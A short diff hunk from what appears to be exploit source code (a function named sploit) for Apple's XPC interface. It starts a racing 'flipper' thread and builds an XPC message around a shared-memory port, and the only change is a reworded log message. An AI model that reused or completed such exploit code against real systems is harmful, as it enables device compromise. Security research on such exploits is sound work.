@@ -834,7 +834,7 @@ static mach_port_t sploit() {
   // start the flipper thread
   pthread_t th;
   pthread_create(&th, NULL, flipper_thread, (void*)flipper);
-  printf("started flipper thread\n");
+  printf("[INFO]: started flipper thread\n");
 
   // now build the XPC message using that shm port as an OOL data
   oxpc_object_t xpc_msg_dict = oxpc_dictionary_alloc();
